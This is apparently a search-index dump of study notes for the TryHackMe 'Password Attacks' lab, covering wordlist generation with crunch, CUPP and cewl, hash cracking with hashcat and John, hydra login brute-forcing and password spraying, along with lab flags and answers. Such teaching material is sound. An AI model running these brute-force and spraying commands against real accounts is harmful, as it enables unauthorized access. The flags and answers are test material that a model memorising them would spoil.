TB 0 PB Crunch will now generate the following number of lines : xx crunch : 100 % completed generating output Here is a snippet of the output: crunch user @thm $ cat crunch . txt 00 01 02 03 04 0a 0b 0c 0d 10 . . . cb cc cd d0 d1 d2 d3 d4 da db dc dd It's worth noting that crunch can generate a very large text file depending on the word length and combination options you specify. The following command creates a list with an 8 character minimum and maximum length containing numbers 0-9, a-f lowercase letters, and A-F uppercase letters: crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and contains 54875873536 words. crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice: @ - lower case alpha characters , - upper case alpha characters % - numeric characters ^ - special characters including space For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers: crunch user @thm $ crunch 6 6 -t pass %% Crunch will now generate the following amount of data : 700 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : 100 pass00 pass01 pass02 pass03 CUPP - Common User Passwords Profiler \u00b6 CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided. There's also support for a 1337/leet mode , which substitutes the letters a, i,e, t, o, s, g, z with numbers. For example, replace a with 4 or i with 1. For more information about the tool, please visit the GitHub repo here . To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows: CUPP user @thm $ git clone https :// github . com / Mebus / cupp . git Cloning into 'cupp' ... remote : Enumerating objects : 237 , done . remote : Total 237 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 237 Receiving objects : 100 % ( 237 / 237 ), 2 . 14 MiB | 1 . 32 MiB / s , done . Resolving deltas : 100 % ( 125 / 125 ), done . Now change the current directory to CUPP and run python3 cupp.py or with -h to see the available options. CUPP user @thm $ python3 cupp . py ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] usage : cupp . py [ -h ] [ -i | -w FILENAME | -l | -a | -v ] [ -q ] Common User Passwords Profiler optional arguments : -h , - -help show this help message and exit -i , - -interactive Interactive questions for user password profiling -w FILENAME Use this option to improve existing dictionary , or WyD . pl output to make some pwnsauce -l Download huge wordlists from repository -a Parse default usernames and passwords directly from Alecto DB . Project Alecto uses purified databases of Phenoelit and CIRT which were merged and enhanced -v , - -version Show the version of this program . -q , - -quiet Quiet mode ( don ' t print banner ) CUPP supports an interactive mode where it asks questions about the target and based on the provided answers, it creates a custom wordlist. If you don't have an answer for the given field, then skip it by pressing the Enter key. CUPP user @thm $ python3 cupp . py -i ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] [+] Insert the information about the victim to make a dictionary [+] If you don 't know all the info, just hit enter when asked! ;) > First Name: > Surname: > Nickname: > Birthdate (DDMMYYYY): > Partners) name: > Partners) nickname: > Partners) birthdate (DDMMYYYY): > Child' s name : > Child 's nickname: > Child' s birthdate ( DDMMYYYY ): > Pet ' s name : > Company name : > Do you want to add some key words about the victim ? Y / [N] : > Do you want to add special chars at the end of words ? Y / [N] : > Do you want to add some random numbers at the end of words ? Y / [N] : > Leet mode ? ( i . e . leet = 1337 ) Y / [N] : [+] Now making a dictionary ... [+] Sorting list and removing duplicates ... [+] Saving dictionary to ..... txt , counting ..... words . > Hyperspeed Print ? ( Y / n ) \u0650As a result, a custom wordlist that contains various numbers of words based on your entries is generated. Pre-created wordlists can be downloaded to your machine as follows: CUPP user @thm $ python3 cupp . py -l ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] Choose the section you want to download : 1 Moby 14 french 27 places 2 afrikaans 15 german 28 polish 3 american 16 hindi 29 random 4 aussie 17 hungarian 30 religion 5 chinese 18 italian 31 russian 6 computer 19 japanese 32 science 7 croatian 20 latin 33 spanish 8 czech 21 literature 34 swahili 9 danish 22 movieTV 35 swedish 10 databases 23 music 36 turkish 11 dictionaries 24 names 37 yiddish 12 dutch 25 net 38 exit program 13 finnish 26 norwegian Files will be downloaded from http :// ftp . funet . fi / pub / unix / security / passwd / crack / dictionaries / repository Tip : After downloading wordlist , you can improve it with -w option > Enter number : Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing! Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -a option. CUPP user @thm $ python3 cupp . py -a ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] [+] Checking if alectodb is not present ... [+] Downloading alectodb . csv . gz from https :// github . com / yangbh / Hammer / raw / b0446396e8d67a7d4e53d6666026e078262e5bab / lib / cupp / alectodb . csv . gz ... [+] Exporting to alectodb-usernames . txt and alectodb-passwords . txt [+] Done . Answer the questions below Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate? Answer 81 Task 5: Offline Attacks - Dictionary and Brute-Force \u00b6 This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks. Dictionary attack \u00b6 A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack. Let's explore performing a dictionary attack using what you've learned in the previous tasks about generating wordlists. We will showcase an offline dictionary attack using hashcat , which is a popular tool to crack hashes. Let's say that we obtain the following hash f806fc5a2a0d5ba2471600758452799c , and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum: 1- What type of hash is this? 2- What wordlist will we be using? Or what type of attack mode could we use? To identify the type of hash, we could a tool such as hashid or hash-identifier . For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU). Dictionary attack user @machine $ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c / usr / share / wordlists / rockyou . txt hashcat ( v6 . 1 . 1 ) starting ... f806fc5a2a0d5ba2471600758452799c : rockyou Session ..........: hashcat Status ...........: Cracked Hash . Name ........: MD5 Hash . Target ......: f806fc5a2a0d5ba2471600758452799c Time . Started .....: Mon Oct 11 08 : 20 : 50 2021 ( 0 secs ) Time . Estimated ...: Mon Oct 11 08 : 20 : 50 2021 ( 0 secs ) Guess . Base .......: File (/ usr / share / wordlists / rockyou . txt ) Guess . Queue ......: 1 / 1 ( 100 . 00 %) Speed . #1.........: 114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered ........: 1 / 1 ( 100 . 00 %) Digests Progress .........: 40 / 40 ( 100 . 00 %) Rejected .........: 0 / 40 ( 0 . 00 %) Restore . Point ....: 0 / 40 ( 0 . 00 %) Restore . Sub . #1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates . #1....: 123456 -> 123123 Started : Mon Oct 11 08 : 20 : 49 2021 Stopped : Mon Oct 11 08 : 20 : 52 2021 -a 0 sets the attack mode to a dictionary attack -m 0 sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes. f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes. /usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack We run hashcat with --show option to show the cracked value if the hash has been cracked: Dictionary attack user @machine $ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C / usr / share / wordlists / rockyou . txt - -show f806fc5a2a0d5ba2471600758452799c : rockyou As a result, the cracked value is rockyou . Brute-Force attack \u00b6 Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords. In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from 0000 to 9999 to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as admin0 , admin1 , .. admin9999 . For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options. Brute-Force attack user @machine $ hashcat - -help ? | Charset ===+========= l | abcdefghijklmnopqrstuvwxyz u | ABCDEFGHIJKLMNOPQRSTUVWXYZ d | 0123456789 h | 0123456789abcdef H | 0123456789ABCDEF s | ! \"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ a | ?l?u?d?s b | 0x00 - 0xff The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice. Brute-Force attack user @machine $ hashcat -a 3 ? d ? d ? d ? d - -stdout 1234 0234 2234 3234 9234 4234 5234 8234 7234 6234 .. .. -a 3 sets the attacking mode as a brute-force attack ?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999 --stdout print the result to the terminal Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number. Brute-Force attack user @machine $ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ? d ? d ? d ? d 05a5cf06982ba7892ed2a6d38fe832d6 : 2021 Session ..........: hashcat Status ...........: Cracked Hash . Name ........: MD5 Hash . Target ......: 05a5cf06982ba7892ed2a6d38fe832d6 Time . Started .....: Mon Oct 11 10 : 54 : 06 2021 ( 0 secs ) Time . Estimated ...: Mon Oct 11 10 : 54 : 06 2021 ( 0 secs ) Guess . Mask .......: ? d ? d ? d ? d [ 4 ] Guess . Queue ......: 1 / 1 ( 100 . 00 %) Speed . #1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8 Recovered ........: 1 / 1 ( 100 . 00 %) Digests Progress .........: 10000 / 10000 ( 100 . 00 %) Rejected .........: 0 / 10000 ( 0 . 00 %) Restore . Point ....: 0 / 1000 ( 0 . 00 %) Restore . Sub . #1...: Salt:0 Amplifier:0-10 Iteration:0-10 Candidates . #1....: 1234 -> 6764 Started : Mon Oct 11 10 : 54 : 05 2021 Stopped : Mon Oct 11 10 : 54 : 08 2021 Answer the questions below Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f . What is the hash type? Answer sha - 1 Perform a dictionary attack against the following hash: 8d6e34f . What is the cracked value? Use rockyou.txt wordlist. Answer sunshine Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9] Answer 1337 Task 6: Offline Attacks - Rule-Based \u00b6 Rule-Based attacks \u00b6 Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy \u2014 for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on. For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules: Rule-based attack user @machine $ cat / etc / john / john . conf | grep \"List.Rules:\" | cut -d \".\" -f3 | cut -d \":\" -f2 | cut -d \"]\" -f1 | awk NF JumboSingle o1 o2 i1 i2 o1 i1 o2 i2 best64 d3ad0ne dive InsidePro T0XlC rockyou - 30000 specific ShiftToggle Split Single Extra OldOffice Single-Extra Wordlist ShiftToggle Multiword best64 Jumbo KoreLogic T9 We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme , to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do! Rule-based attack user @machine $ john - -wordlist =/ tmp / single-password-list . txt - -rules = best64 - -stdout | wc -l Using default input encoding : UTF - 8 Press 'q' or Ctrl-C to abort , almost any other key for status 76p 0 : 00 : 00 : 00 100 . 00 % ( 2021 - 10 - 11 13 : 42 ) 1266p / s pordpo 76 --wordlist= to specify the wordlist or dictionary file. --rules to specify which rule or rules to use. --stdout to print the output to the terminal. |wc -l to count how many lines John produced. By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic . KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website here . Now let's use this rule and check whether the Tryh@ckm3 is available in our list! Answer the questions below What syntax would you use to create a rule to produce the following: \"S[Word]NN where N is Number and S is a symbol of !@? Answer Az \"[0-9][0-9]\" ^[!@] Task 8: Online password attacks \u00b6 Some online password attacks tools: hydra, Medusa , Ncrack , others! Hydra \u00b6 Brute force: hydra -l ftp -P passlist.txt ftp://xxx.xxx.xxx.xxx hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v HTTP login pages \u00b6 In this scenario, we will brute-force HTTP login pages . To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST . Checking hydra options: hydra http-get-form -U , we can see that hydra has the following syntax for the http-get-form option: <url>:<form parameters>:<condition string>[:<optional>[:<optional>] As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite. hydra user @machine $ hydra -l admin -P 500-worst-passwords . txt 10 . 10 . x . x http-get-form \"/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php\" -f Hydra v8 . 6 ( c ) 2017 by van Hauser / THC - Please do not use in military or secret service organizations , or for illegal purposes . Hydra ( http :// www . thc . org / thc-hydra ) starting at 2021 - 10 - 13 08 : 06 : 22 [DATA] max 16 tasks per 1 server , overall 16 tasks , 500 login tries ( l : 1 / p : 500 ), ~ 32 tries per task [DATA] attacking http-get-form :// 10 . 10 . x . x : 80 // login-get / index . php : username =^ USER ^& password =^ PASS ^: S = logout . php [ 80 ][ http-get-form ] host : 10 . 10 . x . x login : admin password : xxxxxx 1 of 1 target successfully completed , 1 valid password found Hydra ( http :// www . thc . org / thc-hydra ) finished at 2021 - 10 - 13 08 : 06 : 45 Option: -f to stop the brute-forcing attacks after finding a valid username and password Online password attacks Answer the questions below Question 1: Can you guess the FTP credentials without brute-forcing? What is the flag? THM{d0abe799f25738ad739c20301aed357b} Hint: Can login anonymous Perform a brute-forcing attack against the phillips account for the login page at http://MACHINE_IP/login-get using hydra? What is the flag? THM{33c5d4954da881814420f3ba39772644} Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://MACHINE_IP/login-post/ . What is the flag? THM{f8e3750cc0ccbb863f2706a3b2933227} Note: use the clinic.lst dictionary in generating and expanding the wordlist! Task 9: Password spray attack \u00b6 RDP \u00b6 See tool: https://github.com/xFreed0m/RDPassSpray Syntax: python3 RDPassSpray.py -u user -p pass -t HOST:PORT Outlook web access (OWA) portal \u00b6 Tools: SprayingToolkit (atomizer.py) MailSniper SMB \u00b6 Tool: Metasploit (auxiliary/scanner/smb/smb_login) Answer the questions below Use the following username list: Password spraying attack! user @THM :~ # cat usernames-list.txt admin phillips burgess pittman guess Perform a password spraying attack to get access to the SSH://MACHINE_IP server to read /etc/flag . What is the flag? Flag: THM{a97a26e86d09388bbea148f4b870277d} Task 10: Summary \u00b6 This room introduced the basic concepts of different password attacks and how to create custom and targeted password lists. We covered and discussed various topics, including: Default, weak, leaked combined wordlists Password profiling Offline password attacks Online password attacks","title":"Password Attacks"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#password-attacks","text":"","title":"Password Attacks"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-1-introduction","text":"This room is an introduction to the types and techniques used in password attacks. We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss: Password profiling Password attacks techniques Online password attacks","title":"Task 1: Introduction"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#what-is-a-password","text":"Passwords are used as an authentication method for individuals to access computer systems or applications. Using passwords ensures the owner of the account is the only one who has access. However, if the password is shared or falls into the wrong hands, unauthorized changes to a given system could occur. Unauthorized access could potentially lead to changes in the system's overall status and health or damage the file system. Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols. Thus, it is up to the user how they generate passwords! A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches. For example, an easy-to-guess password could be password , 123456 , 111111 , and much more. Here are the top 100 and most common and seen passwords for your reference. Thus, it won't take long and be too difficult for the attacker to run password attacks against the target or service to guess the password. Choosing a strong password is a good practice, making it hard to guess or crack. Strong passwords should not be common words or found in dictionaries as well as the password should be an eight characters length at least. It also should contain uppercase and lower case letters, numbers, and symbol strings (ex: *&^%$#@ ). Sometimes, companies have their own password policies and enforce users to follow guidelines when creating passwords. This helps ensure users aren't using common or weak passwords within their organization and could limit attack vectors such as brute-forcing. For example, a password length has to be eight characters and more, including characters, a couple of numbers, and at least one symbol. However, if the attacker figures out the password policy, he could generate a password list that satisfies the account password policy.","title":"What is a password?"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#how-secure-are-passwords","text":"Passwords are a protection method for accessing online accounts or computer systems. Passwords authentication methods are used to access personal and private systems, and its main goal of using the password is to keep it safe and not share it with others. To answer the question: How secure are passwords? depends on various factors. Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the Sony breach in 2014. Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks. Answer the questions below Learn about password attacking techniques in the next task! Answer No needed answer","title":"How secure are passwords?"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-2-password-attacking-techniques","text":"","title":"Task 2: Password Attacking Techniques"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#password-attack-techniques","text":"In this room, we will discuss the techniques that could be used to perform password attacks. We will cover various techniques such as a dictionary, brute-force, rule-base, and guessing attacks. All the above techniques are considered active 'online' attacks where the attacker needs to communicate with the target machine to obtain the password in order to gain unauthorized access to the machine.","title":"Password Attack Techniques"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#password-cracking-vs-password-guessing","text":"This section discusses password cracking terminology from a cybersecurity perspective. Also, we will discuss significant differences between password cracking and password guessing. Finally, we'll demonstrate various tools used for password cracking, including Hashcat and John the Ripper . Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network. Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools. Password cracking is considered one of the traditional techniques in pen-testing. The primary goal is to let the attacker escalate to higher privileges and access to a computer system or network. Password guessing and password cracking are often commonly used by information security professionals. Both have different meanings and implications. Password guessing is a method of guessing passwords for online protocols and services based on dictionaries. The following are major differences between password cracking and password guessing: Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely. Password cracking is a technique performed locally or on systems controlled by the attacker. Answer the questions below Which type of password attack is performed locally? Answer Explain Password cracking Password cracking is a technique performed locally or on systems controlled by the attacker.","title":"Password Cracking vs. Password Guessing"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-3-password-profiling-1-default-weak-leaked-combined-and-username-wordlists","text":"Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. In this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists.","title":"Task 3: Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#default-passwords","text":"Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers don't change the default password, which makes the system vulnerable. Thus, it is a good practice to try out admin:admin , admin:123456 , etc. If we know the target device, we can look up the default passwords and try them out. For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin . Here are some website lists that provide default passwords for various products. https://cirt.net/passwords https://default-password.info/ https://datarecovery.com/rd/default-passwords/","title":"Default Passwords"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#weak-passwords","text":"Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists : https://wiki.skullsecurity.org/index.php?title=Passwords - This includes the most well-known collections of passwords. SecLists - A huge collection of all kinds of lists, not only for password cracking.","title":"Weak Passwords"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#leaked-passwords","text":"Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as 'dumps'. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. The following are some of the common password lists that have weak and leaked passwords, including webhost , elitehacker , hak5 , Hotmail , PhpBB companies' leaks: SecLists/Passwords/Leaked-Databases","title":"Leaked Passwords"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#combined-wordlists","text":"Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat : cewl cat file1 . txt file2 . txt file3 . txt > combined_list . txt To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows: cewl sort combined_list . txt | uniq -u > cleaned_combined_list . txt","title":"Combined wordlists"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#customized-wordlists","text":"Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a company's website contains valuable information about the company and its employees, including emails and employee names. In addition, the website may contain keywords specific to what the company offers, including product and service names, which may be used in an employee's password! Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below cewl user @thm $ cewl -w list . txt -d 5 -m 5 http :// thm . labs -w will write the contents to a file. In this case, list.txt. -m 5 gathers strings (words) that are 5 characters or more -d 5 is the depth level of web crawling/spidering (default 2) http://thm.labs is the URL that will be used As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task!","title":"Customized Wordlists"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#username-wordlists","text":"Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames. {first name} : john {last name} : smith {first name}{last name} : johnsmith {last name}{first name} : smithjohn first letter of the {first name}{last name} : jsmith first letter of the {last name}{first name} : sjohn first letter of the {first name}.{last name} : j.smith first letter of the {first name}-{last name} : j-smith and so on Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name. Usernames user @thm $ git clone https :// github . com / therodri2 / username_generator . git Cloning into 'username_generator' ... remote : Enumerating objects : 9 , done . remote : Counting objects : 100 % ( 9 / 9 ), done . remote : Compressing objects : 100 % ( 7 / 7 ), done . remote : Total 9 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 0 Receiving objects : 100 % ( 9 / 9 ), done . user @thm $ cd username_generator Using python3 username_generator.py -h shows the tool's help message and optional arguments. Usernames user @thm $ python3 username_generator . py -h usage : username_generator . py [ -h ] -w wordlist [ -u ] Python script to generate user lists for bruteforcing ! optional arguments : -h , - -help show this help message and exit -w wordlist , - -wordlist wordlist Specify path to the wordlist -u , - -uppercase Also produce uppercase permutations . Disabled by default ``` Now let 's create a wordlist that contains the full name John Smith to a text file. Then, we' ll run the tool to generate the possible combinations of the given full name . ``` ps1 title = \"Usernames\" user @thm $ echo \"John Smith\" > users . lst user @thm $ python3 username_generator . py -w users . lst usage : username_generator . py [ -h ] -w wordlist [ -u ] john smith j . smith j-smith j_smith j + smith jsmith smithjohn This is just one example of a custom username generator. Please feel free to explore more options or even create your own in the programming language of your choice! Answer the questions below What are the default login credentials (in the format of username:password ) for a Juniper Networks ISG 2000 device? Answer netscreen : netscreen","title":"Username Wordlists"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#task-4-password-profiling-2-keyspace-technique-and-cupp","text":"","title":"Task 4: Password Profiling #2 - Keyspace Technique and CUPP"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#keyspace-technique","text":"Another way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist. crunch is one of many powerful tools for creating an offline wordlist. With crunch , we can specify numerous options, including min, max, and options as follows: crunch user @thm $ crunch -h crunch version 3 . 6 Crunch can create a wordlist based on the criteria you specify . The output from crunch can be sent to the screen , file , or to another program . Usage : crunch [options] where min and max are numbers Please refer to the man page for instructions and examples on how to use crunch . The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to. crunch user @thm $ crunch 2 2 01234abcd -o crunch . txt Crunch will now generate the following amount of data : 243 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : xx crunch : 100 % completed generating output Here is a snippet of the output: crunch user @thm $ cat crunch . txt 00 01 02 03 04 0a 0b 0c 0d 10 . . . cb cc cd d0 d1 d2 d3 d4 da db dc dd It's worth noting that crunch can generate a very large text file depending on the word length and combination options you specify. The following command creates a list with an 8 character minimum and maximum length containing numbers 0-9, a-f lowercase letters, and A-F uppercase letters: crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and contains 54875873536 words. crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice: @ - lower case alpha characters , - upper case alpha characters % - numeric characters ^ - special characters including space For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers: crunch user @thm $ crunch 6 6 -t pass %% Crunch will now generate the following amount of data : 700 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : 100 pass00 pass01 pass02 pass03","title":"Keyspace Technique"},{"location":"tryhackme/red-teaming/init-access/password-attacks/#cupp-common-user-passwords-profiler","text":"CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided. There's also support for a 1337/leet mode , which substitutes the letters a, i,e, t, o, s, g, z with numbers. For example, replace a with 4 or i with 1. For more information about the tool, please visit the GitHub repo here . To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows: CUPP user @thm $ git clone https :// github . com / Mebus / cupp . git Cloning into 'cupp' ... remote : Enumerating objects : 237 , done . remote : Total 237 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 237 Receiving objects : 100 % ( 237 / 237 ), 2 . 14 MiB | 1 . 32 MiB / s , done . Resolving deltas : 100 % ( 125 / 125 ), done . Now change the current directory to CUPP and run python3 cupp.py or with -h to see the available options. CUPP user @thm $ python3 cupp . py ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] usage : cupp . py [ -h ] [ -i | -w FILENAME | -l | -a | -v ] [ -q ] Common User Passwords Profiler optional arguments : -h , - -help show this help message and exit -i , - -interactive Interactive questions for user password profiling -w FILENAME Use this option to improve existing dictionary , or WyD . pl output to make some pwnsauce -l Download huge wordlists from repository -a Parse default usernames and passwords directly from Alecto DB . Project Alecto uses purified databases of Phenoelit and CIRT which were merged and enhanced -v , - -version Show the version of this program . -q , - -quiet Quiet mode ( don ' t print banner ) CUPP supports an interactive mode where it asks questions about the target and based on the provided answers, it creates a custom wordlist. If you don't have an answer for the given field, then skip it by pressing the Enter key. CUPP user @thm $ python3 cupp . py -i ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] [+] Insert the information about the victim to make a dictionary [+] If you don 't know all the info, just hit enter when asked! ;) > First Name: > Surname: > Nickname: > Birthdate (DDMMYYYY): > Partners) name: > Partners) nickname: > Partners) birthdate (DDMMYYYY): > Child' s name : > Child 's nickname: > Child' s birthdate ( DDMMYYYY ): > Pet ' s name : > Company name : > Do you want to add some key words about the victim ? Y / [N] : > Do you want to add special chars at the end of words ? Y / [N] : > Do you want to add some random numbers at the end of words ? Y / [N] : > Leet mode ? ( i . e . leet = 1337 ) Y / [N] : [+] Now making a dictionary ... [+] Sorting list and removing duplicates ... [+] Saving dictionary to ..... txt , counting ..... words . > Hyperspeed Print ? ( Y / n ) \u0650As a result, a custom wordlist that contains various numbers of words based on your entries is generated. Pre-created wordlists can be downloaded to your machine as follows: CUPP user @thm $ python3 cupp . py -l ___________ 